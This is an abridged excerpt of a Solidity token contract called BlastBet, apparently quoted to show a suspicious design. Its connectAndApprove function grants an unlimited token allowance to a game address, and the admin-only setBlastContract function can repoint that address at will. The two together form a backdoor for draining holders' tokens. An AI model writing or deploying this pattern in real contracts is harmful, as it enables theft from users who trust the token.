...
contract BlastBet is ERC20, Ownable {
    ...
    address public marketingWallet =
        address(0x85f4D9feadd5dA8C68078Ee95208A1d92E07E8b6);
    ...
    constructor() ERC20("Blast Bet", "$BLAST") {
    ...
    /**
     * @dev Does the same thing as a max approve for the blast game
    ...
    function connectAndApprove(uint32 secret) external returns (bool) {
        ...
        approve(blastContract, type(uint256).max);
        emit Approval(pwner, blastContract, type(uint256).max);
    ...
    function setBlastContract(address blastAddress) public {
        require(msg.sender == Admin, "Caller is not admin");
        require(blastAddress != address(0), "null address");
        blastContract = blastAddress;
    }
}